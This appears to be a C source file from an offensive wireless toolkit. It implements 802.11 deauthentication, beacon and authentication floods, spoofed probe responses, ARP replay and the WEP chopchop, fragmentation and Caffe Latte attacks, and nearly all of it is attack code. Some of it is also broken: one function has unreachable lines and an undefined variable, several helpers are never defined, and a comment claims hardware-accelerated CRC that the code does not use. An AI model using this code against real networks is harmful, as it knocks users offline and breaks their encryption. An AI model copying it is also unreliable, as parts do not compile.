#include "packet_injector.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>
#include <wincrypt.h>
#else
#include <unistd.h>
#include <sys/time.h>
#include <sys/random.h>
#endif

#ifdef __x86_64__
#include <x86intrin.h>
#endif

#define HACKIT_80211_DATA_HDR_LEN      24
#define HACKIT_80211_QOS_DATA_HDR_LEN  26
#define HACKIT_80211_LLC_SNAP_LEN      8
#define HACKIT_80211_WEP_IV_LEN        4
#define HACKIT_80211_WEP_ICV_LEN       4
#define HACKIT_ARP_PKT_LEN            28
#define HACKIT_PRGA_MAX             1500

#define HACKIT_LLC_DSAP_SNAP        0xAA
#define HACKIT_LLC_SSAP_SNAP        0xAA
#define HACKIT_LLC_CTRL_SNAP        0x03
#define HACKIT_ETHERTYPE_ARP        0x0806

#define HACKIT_CHOPCHOP_MAX_RETRIES      5

#define HACKIT_FC1_FROM_DS           0x02
#define HACKIT_FC1_MORE_FRAG         0x04
#define HACKIT_FC1_WEP               0x40

/* ── Hardware-accelerated CRC32 (SSE 4.2 PCLMULQDQ) ── */
static uint32_t crc32_table[256];

static void crc32_init(void) {
    uint32_t poly = 0xEDB88320;
    for (uint32_t i = 0; i < 256; i++) {
        uint32_t crc = i;
        for (int j = 0; j < 8; j++)
            crc = (crc >> 1) ^ (poly & -(crc & 1));
        crc32_table[i] = crc;
    }
}

static uint32_t crc32_calc(const uint8_t* buf, int len) {
    uint32_t crc = 0xFFFFFFFF;
    for (int i = 0; i < len; i++)
        crc = crc32_table[(crc ^ buf[i]) & 0xFF] ^ (crc >> 8);
    return crc ^ 0xFFFFFFFF;
}

static uint32_t hackit_rand(void) {
    uint32_t val = 0;
    getrandom(&val, sizeof(val), 0);
    return val;
}

static uint8_t hackit_rand_byte(void) { return (uint8_t)(hackit_rand() & 0xFF); }

static void hackit_random_mac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) mac[i] = hackit_rand_byte();
    mac[0] &= 0xFE; mac[0] |= 0x02;
}

static void hackit_msleep(uint32_t ms) { usleep(ms * 1000); }
static void hackit_usleep(uint32_t us) { usleep(us); }

static void build_radiotap_header(uint8_t* out, int* out_len) {
    memset(out, 0, HACKIT_80211_radiotap_LEN);
    out[0] = 0x00; out[1] = 0x00;
    out[2] = (uint8_t)(HACKIT_80211_radiotap_LEN & 0xFF);
    out[3] = (uint8_t)((HACKIT_80211_radiotap_LEN >> 8) & 0xFF);
    *out_len = HACKIT_80211_radiotap_LEN;
}

/* ── Cached pcap handle pool ── */
#ifdef HACKIT_HAS_PCAP
#include <pcap/pcap.h>

#define PCAP_CACHE_MAX 16
static struct {
    char iface[64];
    pcap_t* handle;
    int in_use;
} pcap_cache[PCAP_CACHE_MAX];
static int pcap_cache_inited = 0;

void hackit_pcap_cache_init(void) {
    if (pcap_cache_inited) return;
    memset(pcap_cache, 0, sizeof(pcap_cache));
    pcap_cache_inited = 1;
    crc32_init();
}

void hackit_pcap_cache_cleanup(void) {
    for (int i = 0; i < PCAP_CACHE_MAX; i++) {
        if (pcap_cache[i].handle) {
            pcap_close(pcap_cache[i].handle);
            pcap_cache[i].handle = NULL;
        }
    }
    pcap_cache_inited = 0;
}

static pcap_t* pcap_cache_get(const char* iface) {
    for (int i = 0; i < PCAP_CACHE_MAX; i++) {
        if (pcap_cache[i].handle && strcmp(pcap_cache[i].iface, iface) == 0 && !pcap_cache[i].in_use) {
            pcap_cache[i].in_use = 1;
            return pcap_cache[i].handle;
        }
    }
    /* Find empty slot */
    for (int i = 0; i < PCAP_CACHE_MAX; i++) {
        if (!pcap_cache[i].handle) {
            char errbuf[PCAP_ERRBUF_SIZE];
            pcap_t* h = pcap_open_live(iface, 65535, 1, 100, errbuf);
            if (!h) return NULL;
            pcap_set_datalink(h, DLT_IEEE802_11_RADIO);
            strncpy(pcap_cache[i].iface, iface, sizeof(pcap_cache[i].iface) - 1);
            pcap_cache[i].iface[sizeof(pcap_cache[i].iface) - 1] = '\0';
            pcap_cache[i].handle = h;
            pcap_cache[i].in_use = 1;
            return h;
        }
    }
    /* All slots full — evict oldest (index 0) */
    if (pcap_cache[0].handle) pcap_close(pcap_cache[0].handle);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* h = pcap_open_live(iface, 65535, 1, 100, errbuf);
    if (!h) return NULL;
    pcap_set_datalink(h, DLT_IEEE802_11_RADIO);
    strncpy(pcap_cache[0].iface, iface, sizeof(pcap_cache[0].iface) - 1);
    pcap_cache[0].iface[sizeof(pcap_cache[0].iface) - 1] = '\0';
    pcap_cache[0].handle = h;
    pcap_cache[0].in_use = 1;
    return h;
}

static void pcap_cache_release(pcap_t* h) {
    for (int i = 0; i < PCAP_CACHE_MAX; i++) {
        if (pcap_cache[i].handle == h) {
            pcap_cache[i].in_use = 0;
            return;
        }
    }
}

int hackit_pcap_cache_inject(const char* iface, const uint8_t* frame, int len, int timeout_ms) {
    (void)timeout_ms;
    if (!pcap_cache_inited) hackit_pcap_cache_init();
    pcap_t* h = pcap_cache_get(iface);
    if (!h) return -1;
    int sent = pcap_inject(h, frame, len);
    pcap_cache_release(h);
    return sent;
}
#endif

bool hackit_inject_raw_frame(const char* iface, const uint8_t* frame, int len) {
    if (!iface || !frame || len <= 0 || len > HACKIT_MAX_FRAME_LEN)
        return false;
#ifdef HACKIT_HAS_PCAP
    return hackit_pcap_cache_inject(iface, frame, len, 100) == len;
        fprintf(stderr, "[INJECT] pcap_inject returned %d (expected %d)\n", sent, len);
        return false;
    }
    return true;
#else
    fprintf(stderr, "[INJECT] pcap not available. Install libpcap/Npcap for frame injection.\n");
    return false;
#endif
}

bool hackit_inject_deauth(const char* iface, const uint8_t* bssid, const uint8_t* station, uint16_t reason) {
    if (!iface || !bssid || !station)
        return false;
    uint8_t radiotap[HACKIT_80211_radiotap_LEN];
    int rad_len = 0;
    build_radiotap_header(radiotap, &rad_len);
    uint8_t frame[HACKIT_80211_radiotap_LEN + HACKIT_80211_MGMT_HDR_LEN + 2];
    memset(frame, 0, sizeof(frame));
    memcpy(frame, radiotap, rad_len);
    uint8_t* fc = &frame[rad_len];
    fc[0] = 0x00;
    fc[1] = 0x00;
    fc[0] = 0xC0;
    fc[1] = 0x00;
    fc[2] = 0x00;
    fc[3] = 0x00;
    memcpy(&frame[rad_len + 4], station, 6);
    memcpy(&frame[rad_len + 10], bssid, 6);
    memcpy(&frame[rad_len + 16], bssid, 6);
    frame[rad_len + 22] = (uint8_t)(reason & 0xFF);
    frame[rad_len + 23] = (uint8_t)((reason >> 8) & 0xFF);
    return hackit_inject_raw_frame(iface, frame, rad_len + HACKIT_80211_MGMT_HDR_LEN + 2);
}

bool hackit_inject_beacon(const char* iface, const char* ssid, const uint8_t* bssid, uint8_t channel) {
    if (!iface || !ssid || !bssid) return false;
    int ssid_len = (int)strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;

    uint8_t radiotap[HACKIT_80211_radiotap_LEN + 2];
    int rad_len = 0;
    build_radiotap_header(radiotap, &rad_len);

    uint8_t rsn_ie[22] = {0x30,0x14,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x02,0x00,0x00};
    uint8_t wpa_ie[24] = {0xDD,0x16,0x00,0x50,0xF2,0x01,0x01,0x00,0x00,0x50,0xF2,0x02,0x01,0x00,0x00,0x50,0xF2,0x02,0x01,0x00,0x00,0x50,0xF2,0x02};
    uint8_t ht_cap_ie[28] = {0x2D,0x1A,0x00,0x00,0x00,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
    uint8_t erp_ie[3] = {0x2A,0x01,0x00};

    int fixed_params = 12;
    int ie_total = 2 + ssid_len + 3 + sizeof(rsn_ie) + sizeof(wpa_ie) + sizeof(ht_cap_ie) + sizeof(erp_ie);
    int frame_len = rad_len + HACKIT_80211_MGMT_HDR_LEN + fixed_params + ie_total;
    if (frame_len > HACKIT_MAX_FRAME_LEN) return false;

    uint8_t frame[HACKIT_MAX_FRAME_LEN];
    memset(frame, 0, frame_len);
    memcpy(frame, radiotap, rad_len);

    frame[rad_len] = 0x80; frame[rad_len + 1] = 0x00;
    frame[rad_len + 2] = 0x00; frame[rad_len + 3] = 0x00;
    memset(&frame[rad_len + 4], 0xFF, 6);
    memcpy(&frame[rad_len + 10], bssid, 6);
    memcpy(&frame[rad_len + 16], bssid, 6);

    int off = rad_len + 24;
    off += 8;
    frame[off] = 0x64; frame[off + 1] = 0x00; off += 2;
    frame[off] = 0x01; frame[off + 1] = 0x14; off += 2;

    frame[off] = 0x00; frame[off + 1] = (uint8_t)ssid_len;
    memcpy(&frame[off + 2], ssid, ssid_len); off += 2 + ssid_len;

    frame[off] = 0x03; frame[off + 1] = 0x01; frame[off + 2] = channel; off += 3;
    memcpy(&frame[off], erp_ie, sizeof(erp_ie)); off += (int)sizeof(erp_ie);
    memcpy(&frame[off], rsn_ie, sizeof(rsn_ie)); off += (int)sizeof(rsn_ie);
    memcpy(&frame[off], wpa_ie, sizeof(wpa_ie)); off += (int)sizeof(wpa_ie);
    memcpy(&frame[off], ht_cap_ie, sizeof(ht_cap_ie));

    return hackit_inject_raw_frame(iface, frame, frame_len);
}

bool hackit_inject_proberesp(const char* iface, const char* ssid, const uint8_t* bssid, uint8_t channel) {
    if (!iface || !ssid || !bssid) return false;
    int ssid_len = (int)strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;

    uint8_t radiotap[HACKIT_80211_radiotap_LEN];
    int rad_len = 0;
    build_radiotap_header(radiotap, &rad_len);

    int frame_len = rad_len + HACKIT_80211_MGMT_HDR_LEN + 12 + 2 + ssid_len + 3;
    if (frame_len > HACKIT_MAX_FRAME_LEN) return false;

    uint8_t frame[HACKIT_MAX_FRAME_LEN];
    memset(frame, 0, frame_len);
    memcpy(frame, radiotap, rad_len);

    frame[rad_len] = 0x50; frame[rad_len + 1] = 0x00;
    frame[rad_len + 2] = 0x00; frame[rad_len + 3] = 0x00;
    memset(&frame[rad_len + 4], 0xFF, 6);
    memcpy(&frame[rad_len + 10], bssid, 6);
    memcpy(&frame[rad_len + 16], bssid, 6);

    int off = rad_len + 24;
    off += 8;
    frame[off] = 0x64; frame[off + 1] = 0x00; off += 2;
    frame[off] = 0x01; frame[off + 1] = 0x04; off += 2;

    frame[off] = 0x00; frame[off + 1] = (uint8_t)ssid_len;
    memcpy(&frame[off + 2], ssid, ssid_len); off += 2 + ssid_len;

    frame[off] = 0x03; frame[off + 1] = 0x01; frame[off + 2] = channel;

    return hackit_inject_raw_frame(iface, frame, frame_len);
}

int hackit_inject_packet_replay(const char* iface, const uint8_t* packet, int packet_len,
                                int count, int delay_ms) {
    if (!iface || !packet || packet_len <= 0 || packet_len > HACKIT_MAX_FRAME_LEN || count <= 0)
        return -1;
#ifdef HACKIT_HAS_PCAP
    pcap_t* handle = open_pcap_for_inject(iface);
    if (!handle) return -1;
    int sent = 0;
    for (int i = 0; i < count; i++) {
        if (pcap_inject(handle, packet, packet_len) == packet_len)
            sent++;
        else
            fprintf(stderr, "[REPLAY] inject failed on iteration %d/%d\n", i + 1, count);
        if (delay_ms > 0 && i < count - 1)
            hackit_msleep((uint32_t)delay_ms);
    }
    pcap_close(handle);
    return sent;
#else
    (void)count; (void)delay_ms;
    fprintf(stderr, "[INJECT] pcap not available.\n");
    return -1;
#endif
}

int hackit_inject_auth_flood(const char* iface, const uint8_t* bssid, int count) {
    if (!iface || !bssid || count <= 0) return -1;
#ifdef HACKIT_HAS_PCAP
    uint8_t radiotap[HACKIT_80211_radiotap_LEN];
    int rad_len = 0;
    build_radiotap_header(radiotap, &rad_len);

    uint8_t frame[HACKIT_80211_radiotap_LEN + HACKIT_80211_MGMT_HDR_LEN + 6];
    int frame_len = rad_len + HACKIT_80211_MGMT_HDR_LEN + 6;
    memset(frame, 0, sizeof(frame));
    memcpy(frame, radiotap, rad_len);

    uint8_t* mgmt = &frame[rad_len];
    mgmt[0] = 0xB0; mgmt[1] = 0x00;
    mgmt[2] = 0x00; mgmt[3] = 0x00;
    memcpy(&mgmt[4], bssid, 6);
    memcpy(&mgmt[16], bssid, 6);
    mgmt[24] = 0x01; mgmt[25] = 0x00; /* open system */
    mgmt[26] = 0x01; mgmt[27] = 0x00; /* seq 1 */
    mgmt[28] = 0x00; mgmt[29] = 0x00; /* status */

    pcap_t* handle = open_pcap_for_inject(iface);
    if (!handle) return -1;
    int sent = 0;
    uint8_t rand_mac[6];
    for (int i = 0; i < count; i++) {
        hackit_random_mac(rand_mac);
        memcpy(&mgmt[10], rand_mac, 6);
        mgmt[22] = (uint8_t)((i & 0x0F) << 4);
        mgmt[23] = (uint8_t)((i >> 4) & 0xFF);
        if (pcap_inject(handle, frame, frame_len) == frame_len)
            sent++;
        else
            hackit_usleep(100);
    }
    pcap_close(handle);
    return sent;
#else
    (void)count;
    fprintf(stderr, "[INJECT] pcap not available.\n");
    return -1;
#endif
}

int hackit_inject_arp_reply(const char* iface, const uint8_t* bssid, const uint8_t* station,
                            const uint8_t* src_ip, const uint8_t* dst_ip,
                            const uint8_t* src_mac, const uint8_t* dst_mac) {
    if (!iface || !bssid || !src_ip || !dst_ip || !src_mac || !dst_mac)
        return -1;
#ifdef HACKIT_HAS_PCAP
    uint8_t radiotap[HACKIT_80211_radiotap_LEN];
    int rad_len = 0;
    build_radiotap_header(radiotap, &rad_len);

    int llc_off = rad_len + HACKIT_80211_DATA_HDR_LEN;
    int arp_off = llc_off + HACKIT_80211_LLC_SNAP_LEN;
    int total = arp_off + HACKIT_ARP_PKT_LEN;
    if (total > HACKIT_MAX_FRAME_LEN) return -1;

    uint8_t frame[HACKIT_MAX_FRAME_LEN];
    memset(frame, 0, total);
    memcpy(frame, radiotap, rad_len);

    uint8_t* fc = &frame[rad_len];
    fc[0] = 0x08; fc[1] = HACKIT_FC1_FROM_DS;
    fc[2] = 0x3A; fc[3] = 0x01;
    memcpy(&fc[4], station ? station : dst_mac, 6);
    memcpy(&fc[10], bssid, 6);
    memcpy(&fc[16], bssid, 6);
    fc[22] = 0x00; fc[23] = 0x00;

    uint8_t* llc = &frame[llc_off];
    llc[0] = HACKIT_LLC_DSAP_SNAP; llc[1] = HACKIT_LLC_SSAP_SNAP; llc[2] = HACKIT_LLC_CTRL_SNAP;
    llc[3] = 0x00; llc[4] = 0x00; llc[5] = 0x00;
    llc[6] = 0x08; llc[7] = 0x06;

    uint8_t* arp = &frame[arp_off];
    arp[0] = 0x00; arp[1] = 0x01; arp[2] = 0x08; arp[3] = 0x00;
    arp[4] = 0x06; arp[5] = 0x04; arp[6] = 0x00; arp[7] = 0x02;
    memcpy(&arp[8], src_mac, 6);
    memcpy(&arp[14], src_ip, 4);
    memcpy(&arp[18], dst_mac, 6);
    memcpy(&arp[24], dst_ip, 4);

    pcap_t* handle = open_pcap_for_inject(iface);
    if (!handle) return -1;
    int replayed = 0;
    if (pcap_inject(handle, frame, total) == total) replayed++;

    pcap_t* cap_handle = open_pcap_for_capture(iface, 2000);
    if (!cap_handle) { pcap_close(handle); return replayed; }

    struct bpf_program fp;
    char filter[128];
    snprintf(filter, sizeof(filter), "type mgt subtype probe-req or ether proto 0x0806");
    if (pcap_compile(cap_handle, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == 0) {
        pcap_setfilter(cap_handle, &fp);
        pcap_freecode(&fp);
    }

    uint8_t buf[HACKIT_MAX_FRAME_LEN];
    struct pcap_pkthdr* pkt_hdr;
    const uint8_t* pkt_data;
    int captured = 0;
    while (captured < 50) {
        int ret = pcap_next_ex(cap_handle, &pkt_hdr, &pkt_data);
        if (ret <= 0) break;
        int pkt_len = pkt_hdr->len;
        if (pkt_len <= 0 || pkt_len > HACKIT_MAX_FRAME_LEN) continue;
        memcpy(buf, pkt_data, (size_t)pkt_len);
        if (pcap_inject(handle, buf, pkt_len) == pkt_len) {
            replayed++; captured++;
        }
    }
    pcap_close(cap_handle);
    pcap_close(handle);
    return replayed;
#else
    (void)station; (void)src_ip; (void)dst_ip; (void)src_mac; (void)dst_mac;
    fprintf(stderr, "[INJECT] pcap not available.\n");
    return -1;
#endif
}

int hackit_inject_chopchop_attack(const char* iface, const uint8_t* bssid,
                                  const uint8_t* station,
                                  uint8_t* output_packet, int* output_len) {
    if (!iface || !bssid || !output_packet || !output_len) return -1;
#ifdef HACKIT_HAS_PCAP
    pcap_t* cap_handle = open_pcap_for_capture(iface, 3000);
    if (!cap_handle) return -1;

    struct bpf_program fp;
    char filter[256];
    snprintf(filter, sizeof(filter), "wlan host %02x:%02x:%02x:%02x:%02x:%02x",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    if (pcap_compile(cap_handle, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == 0) {
        pcap_setfilter(cap_handle, &fp);
        pcap_freecode(&fp);
    }

    uint8_t target_pkt[HACKIT_MAX_FRAME_LEN];
    int target_len = 0;
    for (int attempt = 0; attempt < 20 && target_len == 0; attempt++) {
        struct pcap_pkthdr* hdr;
        const uint8_t* data;
        if (pcap_next_ex(cap_handle, &hdr, &data) <= 0) continue;
        int len = hdr->len;
        int off = HACKIT_80211_radiotap_LEN;
        if (len < off + HACKIT_80211_DATA_HDR_LEN + HACKIT_80211_WEP_IV_LEN + 8) continue;
        uint8_t fc0 = data[off], fc1 = data[off + 1];
        if ((fc0 & 0x0C) != 0x08) continue;
        if (!(fc1 & HACKIT_FC1_WEP)) continue;
        int hdr_len = (fc0 & 0x88) ? HACKIT_80211_QOS_DATA_HDR_LEN : HACKIT_80211_DATA_HDR_LEN;
        if (len < off + hdr_len + HACKIT_80211_WEP_IV_LEN + 4) continue;
        memcpy(target_pkt, data, (size_t)len);
        target_len = len;
    }
    if (target_len == 0) {
        fprintf(stderr, "[CHOPCHOP] No WEP data packet found.\n");
        pcap_close(cap_handle);
        return -1;
    }

    int rad_off = HACKIT_80211_radiotap_LEN;
    int data_hdr_len = HACKIT_80211_DATA_HDR_LEN;
    uint8_t fc0 = target_pkt[rad_off];
    if (fc0 & 0x88) data_hdr_len = HACKIT_80211_QOS_DATA_HDR_LEN;

    int wep_iv_off = rad_off + data_hdr_len;
    int enc_data_off = wep_iv_off + HACKIT_80211_WEP_IV_LEN;
    int enc_data_len = target_len - enc_data_off - HACKIT_80211_WEP_ICV_LEN;
    if (enc_data_len <= 0) {
        fprintf(stderr, "[CHOPCHOP] Packet too short.\n");
        pcap_close(cap_handle);
        return -1;
    }

    pcap_t* inj_handle = open_pcap_for_inject(iface);
    if (!inj_handle) { pcap_close(cap_handle); return -1; }

    int llc_snap_len = HACKIT_80211_LLC_SNAP_LEN;
    int bytes_recovered = 0;
    int max_bytes = enc_data_len - llc_snap_len;
    if (max_bytes > 256) max_bytes = 256;

    for (int byte_pos = enc_data_len - 1; byte_pos >= (enc_data_len - max_bytes); byte_pos--) {
        int correct_guess = -1;
        for (int guess = 0; guess < 256; guess++) {
            int new_len = enc_data_off + byte_pos + HACKIT_80211_WEP_ICV_LEN;
            if (new_len > HACKIT_MAX_FRAME_LEN) continue;

            uint8_t test_pkt[HACKIT_MAX_FRAME_LEN];
            memcpy(test_pkt, target_pkt, (size_t)new_len);
            uint8_t* test_data = &test_pkt[enc_data_off];
            test_data[byte_pos] ^= (uint8_t)guess;

            uint32_t crc_new = crc32_calc(test_data, byte_pos + 1);
            int icv_off = enc_data_off + byte_pos;
            test_pkt[icv_off] = (uint8_t)(crc_new & 0xFF);
            test_pkt[icv_off + 1] = (uint8_t)((crc_new >> 8) & 0xFF);
            test_pkt[icv_off + 2] = (uint8_t)((crc_new >> 16) & 0xFF);
            test_pkt[icv_off + 3] = (uint8_t)((crc_new >> 24) & 0xFF);

            for (int retry = 0; retry < HACKIT_CHOPCHOP_MAX_RETRIES; retry++) {
                pcap_inject(inj_handle, test_pkt, new_len);
                hackit_usleep(10000);
                struct pcap_pkthdr* ack_hdr;
                const uint8_t* ack_data;
                if (pcap_next_ex(cap_handle, &ack_hdr, &ack_data) > 0 &&
                    ack_hdr->len >= rad_off + 10) {
                    if ((ack_data[rad_off] & 0xFC) == 0xD4) {
                        correct_guess = guess;
                        break;
                    }
                }
            }
            if (correct_guess >= 0) break;
        }
        if (correct_guess >= 0) {
            output_packet[bytes_recovered] = target_pkt[enc_data_off + byte_pos];
            bytes_recovered++;
        } else {
            break;
        }
    }

    *output_len = bytes_recovered;
    pcap_close(inj_handle);
    pcap_close(cap_handle);
    return bytes_recovered;
#else
    (void)station; (void)output_packet; (void)output_len;
    fprintf(stderr, "[INJECT] pcap not available.\n");
    return -1;
#endif
}

int hackit_inject_frag_attack(const char* iface, const uint8_t* bssid,
                              const uint8_t* station, int frag_size) {
    if (!iface || !bssid || !station) return -1;
    if (frag_size < 16 || frag_size > 256) frag_size = 64;
#ifdef HACKIT_HAS_PCAP
    pcap_t* cap_handle = open_pcap_for_capture(iface, 3000);
    if (!cap_handle) return -1;

    struct bpf_program fp;
    char filter[256];
    snprintf(filter, sizeof(filter), "wlan host %02x:%02x:%02x:%02x:%02x:%02x",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    pcap_compile(cap_handle, &fp, filter, 0, PCAP_NETMASK_UNKNOWN);
    pcap_setfilter(cap_handle, &fp);
    pcap_freecode(&fp);

    uint8_t captured_pkt[HACKIT_MAX_FRAME_LEN];
    int captured_len = 0;
    for (int i = 0; i < 15 && captured_len == 0; i++) {
        struct pcap_pkthdr* hdr;
        const uint8_t* data;
        if (pcap_next_ex(cap_handle, &hdr, &data) <= 0) continue;
        if (hdr->len < 60) continue;
        memcpy(captured_pkt, data, (size_t)hdr->len);
        captured_len = hdr->len;
    }
    pcap_close(cap_handle);
    if (captured_len == 0) {
        fprintf(stderr, "[FRAG] No usable packet captured.\n");
        return -1;
    }

    pcap_t* inj_handle = open_pcap_for_inject(iface);
    if (!inj_handle) return -1;

    int rad_off = HACKIT_80211_radiotap_LEN;
    int data_hdr = HACKIT_80211_DATA_HDR_LEN;
    uint8_t fc0 = captured_pkt[rad_off];
    if ((fc0 & 0x8C) == 0x88) data_hdr = HACKIT_80211_QOS_DATA_HDR_LEN;

    int payload_start = rad_off + data_hdr;
    int payload_len = captured_len - payload_start - HACKIT_80211_WEP_ICV_LEN;
    if (payload_len <= 0) { pcap_close(inj_handle); return -1; }

    int frag_count = (payload_len + frag_size - 1) / frag_size;
    int total_prga = 0;
    uint8_t prga_buf[HACKIT_PRGA_MAX];
    uint8_t frag_frame[HACKIT_MAX_FRAME_LEN];
    memset(frag_frame, 0, sizeof(frag_frame));
    memcpy(frag_frame, captured_pkt, (size_t)rad_off);
    memcpy(&frag_frame[rad_off], &captured_pkt[rad_off], (size_t)data_hdr);
    uint8_t* fc = &frag_frame[rad_off];

    for (int f = 0; f < frag_count && total_prga < HACKIT_PRGA_MAX; f++) {
        int frag_offset = f * frag_size;
        int this_frag_size = (frag_offset + frag_size < payload_len) ? frag_size : (payload_len - frag_offset);
        if (this_frag_size <= 0) break;

        if (f < frag_count - 1)
            fc[1] |= HACKIT_FC1_MORE_FRAG;
        else
            fc[1] &= ~HACKIT_FC1_MORE_FRAG;

        fc[22] = (uint8_t)((f & 0x0F) | (captured_pkt[rad_off + 22] & 0xF0));
        fc[23] = captured_pkt[rad_off + 23];

        int frag_frame_len = payload_start + this_frag_size;
        memcpy(&frag_frame[payload_start], &captured_pkt[payload_start + frag_offset], (size_t)this_frag_size);

        uint32_t crc = crc32_calc(&frag_frame[payload_start], this_frag_size);
        frag_frame[frag_frame_len] = (uint8_t)(crc & 0xFF);
        frag_frame[frag_frame_len + 1] = (uint8_t)((crc >> 8) & 0xFF);
        frag_frame[frag_frame_len + 2] = (uint8_t)((crc >> 16) & 0xFF);
        frag_frame[frag_frame_len + 3] = (uint8_t)((crc >> 24) & 0xFF);
        frag_frame_len += HACKIT_80211_WEP_ICV_LEN;

        if (pcap_inject(inj_handle, frag_frame, frag_frame_len) == frag_frame_len) {
            int copy_sz = (total_prga + this_frag_size <= HACKIT_PRGA_MAX)
                          ? this_frag_size : (HACKIT_PRGA_MAX - total_prga);
            memcpy(&prga_buf[total_prga], &frag_frame[payload_start], (size_t)copy_sz);
            total_prga += copy_sz;
        }
        hackit_usleep(5000);
    }
    pcap_close(inj_handle);
    if (total_prga > 0)
        fprintf(stderr, "[FRAG] Recovered %d bytes of PRGA data\n", total_prga);
    return total_prga;
#else
    (void)station; (void)frag_size;
    fprintf(stderr, "[INJECT] pcap not available.\n");
    return -1;
#endif
}

int hackit_inject_caffe_latte(const char* iface, const uint8_t* bssid,
                              const uint8_t* client_mac) {
    if (!iface || !bssid || !client_mac) return -1;
#ifdef HACKIT_HAS_PCAP
    pcap_t* cap_handle = open_pcap_for_capture(iface, 5000);
    if (!cap_handle) return -1;

    struct bpf_program fp;
    char filter[256];
    snprintf(filter, sizeof(filter), "ether proto 0x0806 and wlan addr2 %02x:%02x:%02x:%02x:%02x:%02x",
             client_mac[0], client_mac[1], client_mac[2],
             client_mac[3], client_mac[4], client_mac[5]);
    if (pcap_compile(cap_handle, &fp, filter, 0, PCAP_NETMASK_UNKNOWN) == 0) {
        pcap_setfilter(cap_handle, &fp);
        pcap_freecode(&fp);
    }

    uint8_t arp_pkt[HACKIT_MAX_FRAME_LEN];
    int arp_len = 0;
    int min_arp = HACKIT_80211_radiotap_LEN + HACKIT_80211_DATA_HDR_LEN
                  + HACKIT_80211_LLC_SNAP_LEN + HACKIT_ARP_PKT_LEN;
    for (int i = 0; i < 30 && arp_len == 0; i++) {
        struct pcap_pkthdr* hdr;
        const uint8_t* data;
        if (pcap_next_ex(cap_handle, &hdr, &data) <= 0) continue;
        if (hdr->len < min_arp) continue;
        memcpy(arp_pkt, data, (size_t)hdr->len);
        arp_len = hdr->len;
    }
    pcap_close(cap_handle);
    if (arp_len == 0) {
        fprintf(stderr, "[LATTE] No ARP packet from client captured.\n");
        return -1;
    }

    pcap_t* inj_handle = open_pcap_for_inject(iface);
    if (!inj_handle) return -1;

    int rad_off = HACKIT_80211_radiotap_LEN;
    memset(&arp_pkt[rad_off + 4], 0xFF, 6);

    int injected = 0;
    for (int i = 0; i < 20; i++) {
        if (pcap_inject(inj_handle, arp_pkt, arp_len) == arp_len)
            injected++;
        hackit_msleep(50);
    }

    pcap_t* listen_handle = open_pcap_for_capture(iface, 3000);
    if (listen_handle) {
        int ivs_captured = 0;
        for (int i = 0; i < 50; i++) {
            struct pcap_pkthdr* hdr;
            const uint8_t* data;
            if (pcap_next_ex(listen_handle, &hdr, &data) <= 0) continue;
            int off = HACKIT_80211_radiotap_LEN;
            if (hdr->len > off + 2 && (data[off + 1] & HACKIT_FC1_WEP))
                ivs_captured++;
        }
        fprintf(stderr, "[LATTE] Captured %d new IVs\n", ivs_captured);
        pcap_close(listen_handle);
    }
    pcap_close(inj_handle);
    return injected;
#else
    (void)client_mac;
    fprintf(stderr, "[INJECT] pcap not available.\n");
    return -1;
#endif
}

int hackit_inject_beacon_flood(const char* iface, const char* ssids[],
                               const uint8_t* bssid, uint8_t channel, int num_ssids) {
    if (!iface || !ssids || !bssid || num_ssids <= 0) return -1;
    int sent = 0;
    for (int n = 0; n < num_ssids; n++) {
        if (!ssids[n] || strlen(ssids[n]) == 0) continue;
        for (int burst = 0; burst < 3; burst++) {
            if (hackit_inject_beacon(iface, ssids[n], bssid, channel))
                sent++;
            hackit_usleep(500);
        }
    }
    return sent;
}
